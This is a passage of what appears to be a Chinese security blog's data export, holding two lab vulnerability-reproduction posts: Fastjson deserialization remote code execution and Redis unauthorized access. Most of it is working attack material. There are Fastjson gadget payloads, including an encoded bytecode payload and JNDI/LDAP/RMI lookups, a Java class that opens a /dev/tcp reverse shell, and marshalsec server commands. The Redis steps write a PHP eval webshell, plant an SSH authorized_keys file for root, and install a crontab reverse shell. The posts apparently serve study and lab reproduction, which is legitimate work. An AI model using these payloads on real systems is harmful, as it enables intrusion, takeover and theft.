&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    &quot;_name&quot;: &quot;aaa&quot;,</span><br><span class=\"line\">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class=\"line\">    &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload3:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class=\"line\">    &quot;properties&quot;: &#123;</span><br><span class=\"line\">      &quot;data_source&quot;: &quot;ldap://localhost:1389/Object&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload4:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class=\"line\">    &quot;targetBeanName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class=\"line\">    &quot;propertyPath&quot;: &quot;foo&quot;,</span><br><span class=\"line\">    &quot;beanFactory&quot;: &#123;</span><br><span class=\"line\">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class=\"line\">      &quot;shareableResources&quot;: [</span><br><span class=\"line\">        &quot;ldap://localhost:1389/Object&quot;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload5:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: Set[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class=\"line\">    &quot;beanFactory&quot;: &#123;</span><br><span class=\"line\">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class=\"line\">      &quot;shareableResources&quot;: [</span><br><span class=\"line\">        &quot;ldap://localhost:1389/obj&quot;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;adviceBeanName&quot;: &quot;ldap://localhost:1389/obj&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload6:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class=\"line\">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload7:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class=\"line\">    &quot;jndiName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class=\"line\">    &quot;loginTimeout&quot;: 0</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"实战渗透测试\"><a href=\"#实战渗透测试\" class=\"headerlink\" title=\"实战渗透测试\"></a>实战渗透测试</h1><h2 id=\"Fastjson-lt-1-2-24远程代码执行\"><a href=\"#Fastjson-lt-1-2-24远程代码执行\" class=\"headerlink\" title=\"Fastjson&lt;1.2.24远程代码执行\"></a>Fastjson&lt;1.2.24远程代码执行</h2><p>1、使用docker搭建环境<br><img src=\"/images/15/1.png\" alt=\"upload successful\"> </p>\n<p>2、访问IP:8090显示此页面表示搭建成功<br><img src=\"/images/15/2.png\" alt=\"upload successful\"> </p>\n<p>3、攻击机中dnslog.java文件，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\"></span><br><span class=\"line\">public class dnslog&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\"></span><br><span class=\"line\">            String[] commands = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping user.`whoami`.dnslog地址&quot;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\"></span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            // do nothing</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>4、使用命令javac dnslog.java编译java文件，得到dnslog.class文件。<br><img src=\"/images/15/3.png\" alt=\"upload successful\"> </p>\n<p>5、将两个文件通过python3 -m http.server命令放到外网环境中<br><img src=\"/images/15/4.png\" alt=\"upload successful\"><br><img src=\"/images/15/5.png\" alt=\"upload successful\"> </p>\n<p>6、使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类dnslog.class<br><img src=\"/images/15/6.png\" alt=\"upload successful\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/mbechler/marshalsec.git</span><br><span class=\"line\">cd marshalsec/</span><br><span class=\"line\">编译项目</span><br><span class=\"line\">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>\n\n<p>成功之后，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件<br><img src=\"/images/15/7.png\" alt=\"upload successful\"> </p>\n<p>7、在当前主机通过生成的marshalsec文件运行rmi服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd target/</span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.229.158:4455/#dnslog&quot; 9999</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/8.png\" alt=\"upload successful\"> </p>\n<p>7、在漏洞页面bp抓包后post提交数据，替换如下payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept:*/*</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.229.158:9999/dnslog&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/9.png\" alt=\"upload successful\"></p>\n<p>8、在dnslog可以看到回显了whoami的结果为root<br><img src=\"/images/15/10.png\" alt=\"upload successful\"> </p>\n<h2 id=\"Fastjson-lt-1-2-48远程代码执行漏洞\"><a href=\"#Fastjson-lt-1-2-48远程代码执行漏洞\" class=\"headerlink\" title=\"Fastjson&lt;1.2.48远程代码执行漏洞\"></a>Fastjson&lt;1.2.48远程代码执行漏洞</h2><p>1、首先使用docker搭建环境<br><img src=\"/images/15/11.png\" alt=\"upload successful\"> </p>\n<p>2、访问8090端口显示页面表示搭建成功<br><img src=\"/images/15/12.png\" alt=\"upload successful\"> </p>\n<p>3、新建一个Exploit.java文件，内容如下，执行一个反弹shell操作。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.BufferedReader;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.io.InputStreamReader;</span><br><span class=\"line\">public class Exploit&#123;</span><br><span class=\"line\">    public Exploit() throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.4.187/4554;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class=\"line\">        InputStream is = p.getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class=\"line\"></span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        while((line = reader.readLine()) != null) &#123;</span><br><span class=\"line\">            System.out.println(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.waitFor();</span><br><span class=\"line\">        is.close();</span><br><span class=\"line\">        reader.close();</span><br><span class=\"line\">        p.destroy();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>4、使用javac命令编译Exploit.java文件，得到Exploit.class文件<br><img src=\"/images/15/13.png\" alt=\"upload successful\"><br>5、将两个文件通过python3 -m http.server命令放到外网环境中<br><img src=\"/images/15/14.png\" alt=\"upload successful\"><br><img src=\"/images/15/15.png\" alt=\"upload successful\"> </p>\n<p>6、使用工具marshalsec开启LDAP服务监听，命令如下，监听端口为6666</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.229.158:4455/#Exploit 6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/16.png\" alt=\"upload successful\"></p>\n<p>7、客户端开启监听，这里我使用windows的nc进行监听<br><img src=\"/images/15/17.png\" alt=\"upload successful\"></p>\n<p>8、抓取数据包，更换传参方式为post，放入payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept: */*</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;name&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class=\"line\">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;x&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;ldap://192.168.229.158:6666/Exploit&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/15/18.png\" alt=\"upload successful\"> </p>\n<p>9、查看监听，已经成功获取了服务器的shell<br><img src=\"/images/15/19.png\" alt=\"upload successful\">  </p>\n"},{"title":"漏洞复现-Redis未授权访问","keywords":"漏洞复现,Redis,未授权,写shell,SSH公钥认证","description":"漏洞复现-Redis未授权访问","cover":"/images/14/7.png","date":"2020-11-29T03:37:12.000Z","_content":"\n\n\n# Redis概念\nredis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。\n\nRedis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。\n<!--more-->\n\n# Redis未授权访问\nredis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。\n\n漏洞产生条件\t\n>1、\tredis服务绑定在6379端口并且该端口可以被访问到\n2、\t没有设置密码认证（一般为空），可以免密码远程登录redis服务。\n# 环境准备\n靶机：\t\nCentos7：192.168.229.157\n![upload successful](/images/14/1.png) \n攻击机：\t\nKali：192.168.229.128\n![upload successful](/images/14/2.png)  \n# 环境搭建\n1、首先下载redis的压缩包\t\n```\nwget http://download.redis.io/releases/redis-2.8.17.tar.gz\n```\n![upload successful](/images/14/3.png) \n\n2、解压压缩包，进入指定路径redis-2.8.17，进行安装\n```\ntar xzf redis-2.8.17.tar.gz\ncd redis-2.8.17\nmake\n```\n![upload successful](/images/14/4.png) \n\n3、进入到src路径，将redis-server和redis-cli拷贝到/usr/bin目录下，后续方便直接启动redis服务器并且将redis-2.8.17目录下面的redis.conf拷贝到/etc下面。\n```\ncd src\ncp redis-server /usr/bin\ncp redis-cli /usr/bin\ncp redis.conf /etc/redis.conf\n```\n![upload successful](/images/14/5.png) \n\n4、启动服务\n```\nredis-server /etc/redis.conf\n```\n![upload successful](/images/14/6.png) \n\n\n# 漏洞复现\n## 写入webshell\n1、首先尝试无密码连接redis，未报错表示连接成功\n```\nredis-cli -h 192.168.229.157\n```\n![upload successful](/images/14/7.png) \n\n2、写入webhsell\n```\nredis-cli -h 192.168.229.157\nconfig set dir /home/\nconfig set dbfilename 8.php\nset webshell \"<?php eval($_POST[1]);?>\"\nsave\n```\n![upload successful](/images/14/8.png) \n\n3、在服务器查看文件，确实写入了webshell\n![upload successful](/images/14/9.png) \n\n\n## 利用“公私钥”认证获得root权限\n\n1、 kali攻击机未授权访问连接\n```\nredis-cli -h 192.168.163.157\nkeys *\n```\n\n![upload successful](/images/14/10.png) \n\n2、在攻击机中生成ssh公钥和私钥，密码设置为空（一路回车即可）\n```\nssh-keygen -t rsa\n```\n![upload successful](/images/14/11.png) \n\n3、进入.ssh目录，将生成的公钥保存到1.txt\n```\ncd /root/.ssh\n(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > 1.txt\n```\n![upload successful](/images/14/12.png) \n\n\n4、将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）\n```\ncat 1.txt | redis-cli -h 192.168.229.157 -x set crack\n```\n![upload successful](/images/14/13.png) \n\n5、使用 CONFIG GET dir 命令得到redis备份的路径\n```\nCONFIG GET dir\n```\n![upload successful](/images/14/14.png) \n\n6、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,并且修改上传公钥文件的名称为authorized_keys。\n```\nconfig set dir /root/.ssh\n  这里设置目录时，可能存在(error) ERR Changing directory: No such file or directory\n  这是因为root从来没有登录过，在被攻击机执行ssh localhost 即可\n  (error) ERR Changing directory: Permission denied\n  说明redis并不是以root启动的，在被攻击机重新使用sudo开启redis服务即可\nCONFIG SET dbfilename authorized_keys\nsave\n```\n![upload successful](/images/14/15.png) \n\n查看攻击机也已经成功生成了公钥文件\n![upload successful](/images/14/16.png) \n\n7、使用ssh免密码登录redis服务器\n```\nssh -i id_rsa root@192.168.229.157\n```\n![upload successful](/images/14/17.png) \n\n## 利用计划任务反弹shell\n1、首先kali机器进行开启监听\n![upload successful](/images/14/18.png) \n\n2、使用redis通过crontab进行反弹shell\n```\nset xxx \"\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.229.128/4455 0>&1\\n\\n\"\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nsave\n```\n![upload successful](/images/14/19.png) \n\n3、查看反弹shell命令已经成功写入了\n![upload successful](/images/14/20.png) \n\n4、攻击机也成功获取了shell\n![upload successful](/images/14/21.png) \n\n","source":"_posts/漏洞复现-Redis未授权访问.md","raw":"---\ntitle: 漏洞复现-Redis未授权访问\ntags: \n  - 漏洞复现\n  - Redis\n  - 未授权\n  - 写shell\n  - SSH公钥认证\ncategories: 漏洞复现\nkeywords: '漏洞复现,Redis,未授权,写shell,SSH公钥认证'\ndescription: 漏洞复现-Redis未授权访问\ncover: /images/14/7.png\ndate: 2020-11-29 11:37:12\n---\n\n\n\n# Redis概念\nredis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。\n\nRedis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。\n<!--more-->\n\n# Redis未授权访问\nredis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。\n\n漏洞产生条件\t\n>1、\tredis服务绑定在6379端口并且该端口可以被访问到\n2、\t没有设置密码认证（一般为空），可以免密码远程登录redis服务。\n# 环境准备\n靶机：\t\nCentos7：192.168.229.157\n![upload successful](/images/14/1.png) \n攻击机：\t\nKali：192.168.229.128\n![upload successful](/images/14/2.png)  \n# 环境搭建\n1、首先下载redis的压缩包\t\n```\nwget http://download.redis.io/releases/redis-2.8.17.tar.gz\n```\n![upload successful](/images/14/3.png) \n\n2、解压压缩包，进入指定路径redis-2.8.17，进行安装\n```\ntar xzf redis-2.8.17.tar.gz\ncd redis-2.8.17\nmake\n```\n![upload successful](/images/14/4.png) \n\n3、进入到src路径，将redis-server和redis-cli拷贝到/usr/bin目录下，后续方便直接启动redis服务器并且将redis-2.8.17目录下面的redis.conf拷贝到/etc下面。\n```\ncd src\ncp redis-server /usr/bin\ncp redis-cli /usr/bin\ncp redis.conf /etc/redis.conf\n```\n![upload successful](/images/14/5.png) \n\n4、启动服务\n```\nredis-server /etc/redis.conf\n```\n![upload successful](/images/14/6.png) \n\n\n# 漏洞复现\n## 写入webshell\n1、首先尝试无密码连接redis，未报错表示连接成功\n```\nredis-cli -h 192.168.229.157\n```\n![upload successful](/images/14/7.png) \n\n2、写入webhsell\n```\nredis-cli -h 192.168.229.157\nconfig set dir /home/\nconfig set dbfilename 8.php\nset webshell \"<?php eval($_POST[1]);?>\"\nsave\n```\n![upload successful](/images/14/8.png) \n\n3、在服务器查看文件，确实写入了webshell\n![upload successful](/images/14/9.png) \n\n\n## 利用“公私钥”认证获得root权限\n\n1、 kali攻击机未授权访问连接\n```\nredis-cli -h 192.168.163.157\nkeys *\n```\n\n![upload successful](/images/14/10.png) \n\n2、在攻击机中生成ssh公钥和私钥，密码设置为空（一路回车即可）\n```\nssh-keygen -t rsa\n```\n![upload successful](/images/14/11.png) \n\n3、进入.ssh目录，将生成的公钥保存到1.txt\n```\ncd /root/.ssh\n(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > 1.txt\n```\n![upload successful](/images/14/12.png) \n\n\n4、将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）\n```\ncat 1.txt | redis-cli -h 192.168.229.157 -x set crack\n```\n![upload successful](/images/14/13.png) \n\n5、使用 CONFIG GET dir 命令得到redis备份的路径\n```\nCONFIG GET dir\n```\n![upload successful](/images/14/14.png) \n\n6、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,并且修改上传公钥文件的名称为authorized_keys。\n```\nconfig set dir /root/.ssh\n  这里设置目录时，可能存在(error) ERR Changing directory: No such file or directory\n  这是因为root从来没有登录过，在被攻击机执行ssh localhost 即可\n  (error) ERR Changing directory: Permission denied\n  说明redis并不是以root启动的，在被攻击机重新使用sudo开启redis服务即可\nCONFIG SET dbfilename authorized_keys\nsave\n```\n![upload successful](/images/14/15.png) \n\n查看攻击机也已经成功生成了公钥文件\n![upload successful](/images/14/16.png) \n\n7、使用ssh免密码登录redis服务器\n```\nssh -i id_rsa root@192.168.229.157\n```\n![upload successful](/images/14/17.png) \n\n## 利用计划任务反弹shell\n1、首先kali机器进行开启监听\n![upload successful](/images/14/18.png) \n\n2、使用redis通过crontab进行反弹shell\n```\nset xxx \"\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.229.128/4455 0>&1\\n\\n\"\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nsave\n```\n![upload successful](/images/14/19.png) \n\n3、查看反弹shell命令已经成功写入了\n![upload successful](/images/14/20.png) \n\n4、攻击机也成功获取了shell\n![upload successful](/images/14/21.png) 